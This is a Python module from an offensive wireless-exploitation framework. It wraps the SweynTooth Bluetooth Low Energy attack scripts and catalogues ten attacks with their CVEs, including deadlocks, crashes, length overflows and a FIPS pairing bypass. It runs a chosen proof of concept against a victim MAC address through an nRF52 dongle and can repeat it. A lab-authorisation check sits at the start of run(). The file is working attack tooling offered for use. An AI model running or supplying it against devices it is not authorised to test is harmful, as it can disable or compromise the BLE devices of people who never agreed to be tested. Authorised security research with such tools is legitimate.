#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""SweynTooth — BLE stack vulnerability attack bridge (CVE-2019-16336 et al.).

SweynTooth exposes 12+ BLE stack vulnerabilities affecting SoCs from major vendors
(Texas Instruments CC2640R2F, NXP KW41Z, Dialog DA14580/86, Microchip ATBTLC1000,
STMicroelectronics BlueNRG-1, Telink TLSR8266, Cypress PSoC 6). Allows:
  - Deadlock (freeze) of BLE peripheral
  - Crash / DoS
  - Bypass security mode 1 level 4 (FIPS pairing)

All attacks require a modified BT dongle (nRF52 or similar) running specific firmware.

Incorporated from:
  - submodules/IoT/sweyntooth (Matheus Eduardo Garbelini / Singapore University)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from pathlib import Path
from typing import Dict, List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)


def _sweyntooth_root() -> Path:
    return Path(__file__).resolve().parents[5] / "sweyntooth"


# Map of known SweynTooth attack scripts to their CVEs and descriptions
_ATTACKS: Dict[str, Dict[str, str]] = {
    "llid_deadlock": {"cve": "CVE-2019-17519", "desc": "LLID deadlock (freeze)"},
    "zero_len_llid": {"cve": "CVE-2019-17517", "desc": "Zero-length LLID crash"},
    "silent_length_overflow": {"cve": "CVE-2019-17516", "desc": "Silent length overflow"},
    "public_key_crash": {"cve": "CVE-2019-17521", "desc": "Public key crash (pairing)"},
    "connection_ind_overflow": {"cve": "CVE-2019-17518", "desc": "Connection IND overflow"},
    "uncontrolled_access": {"cve": "CVE-2019-16336", "desc": "Uncontrolled data access"},
    "sequencenumber_attack": {"cve": "CVE-2019-17071", "desc": "Sequence number attack"},
    "unexpected_public_key": {"cve": "N/A", "desc": "Unexpected public key bypass"},
    "dhcheck_skip": {"cve": "CVE-2019-17520", "desc": "DH check skip — FIPS bypass"},
    "knob_smart_device": {"cve": "CVE-2019-9506", "desc": "KNOB on BLE (derivative)"},
}


class Exploit(Exploit):
    """SweynTooth BLE stack vulnerability bridge (subprocess)."""

    __info__ = {
        "name": "SweynTooth BLE Stack Attack Bridge",
        "description": (
            "Bridges SweynTooth BLE stack exploits: deadlock, crash, DoS, and "
            "FIPS pairing bypass on vulnerable SoCs (TI, NXP, Dialog, Microchip, "
            "ST, Telink, Cypress). Requires nRF52-series dongle with custom firmware. "
            "subprocess only — no BLE stack code imported."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Matheus Eduardo Garbelini / SUTD "
            "(SweynTooth — invoked as subprocess)",
        ),
        "references": (
            "https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks",
            "https://asset-group.github.io/disclosures/sweyntooth/",
            "CVE-2019-16336, CVE-2019-17517 through CVE-2019-17521",
        ),
        "devices": ("ble", "Bluetooth Low Energy SoC"),
    }

    mode = OptString(
        "info",
        "Modo: info | list | <attack_name> (ver list para nomes disponíveis)",
    )
    victim_mac = OptString("", "MAC do dispositivo BLE vítima (ex.: AA:BB:CC:DD:EE:FF)")
    dongle_port = OptString(
        "/dev/ttyACM0",
        "Porta serial do dongle nRF52 (ex.: /dev/ttyACM0)",
    )
    repeat = OptInteger(1, "Número de vezes para repetir o ataque")
    verbose = OptBool(False, "Saída detalhada")
    dry_run = OptBool(False, "Exibir comando sem executar")
    i_know_scope = OptBool(False, "Confirmo que estou em laboratório autorizado")

    def _info_mode(self) -> None:
        print_status("SweynTooth — BLE Stack Vulnerabilities")
        print_info("Fabricantes afetados: TI CC26xx/CC2640R2F, NXP KW41Z, Dialog DA14xxx,")
        print_info("  Microchip ATBTLC1000, STM BlueNRG-1/2, Telink TLSR8266, Cypress PSoC 6")
        print_info("\nHardware necessário: nRF52-series dongle com firmware customizado")
        print_info("Submodule SweynTooth: {}".format(_sweyntooth_root()))
        print_info("\nUse mode=list para ver todos os ataques disponíveis.")

    def _list_mode(self) -> None:
        print_status("Ataques SweynTooth disponíveis:")
        for name, meta in _ATTACKS.items():
            print_info("  {:30} {} — {}".format(name, meta["cve"], meta["desc"]))

    def _run_attack(self, attack_name: str) -> None:
        root = _sweyntooth_root()
        if not root.exists():
            print_error("Submodule sweyntooth não encontrado: {}".format(root))
            print_info("Execute: git submodule update --init submodules/IoT/sweyntooth")
            return

        victim = str(self.victim_mac).strip()
        if not victim:
            print_error("Defina victim_mac.")
            return

        # Search for the attack script
        candidates = list(root.rglob("{}.py".format(attack_name)))
        if not candidates:
            candidates = list(root.rglob("*{}*.py".format(attack_name)))
        if not candidates:
            print_error("Script '{}' não encontrado em {}.".format(attack_name, root))
            self._list_mode()
            return

        poc = candidates[0]
        python_bin = shutil.which("python3") or "python3"
        port = str(self.dongle_port).strip()

        for i in range(max(1, int(self.repeat))):
            cmd: List[str] = [python_bin, str(poc), port, victim]
            if self.verbose:
                cmd.append("-v")
            cmd_str = " ".join(cmd)
            if self.dry_run:
                print_info("DRY RUN [{}/{}] — {}".format(i + 1, int(self.repeat), cmd_str))
                continue
            print_status("[{}/{}] SweynTooth {}: {}".format(
                i + 1, int(self.repeat), attack_name, victim
            ))
            try:
                subprocess.run(cmd, cwd=str(root), check=False)
            except KeyboardInterrupt:
                print_info("\nInterrompido.")
                return
            except Exception as exc:
                print_error("Erro ao executar {}: {}".format(attack_name, exc))
                return

    def run(self) -> None:
        require_authorised_lab(self.i_know_scope)
        mode = str(self.mode).strip().lower()
        if mode == "info":
            self._info_mode()
        elif mode == "list":
            self._list_mode()
        else:
            self._run_attack(mode)
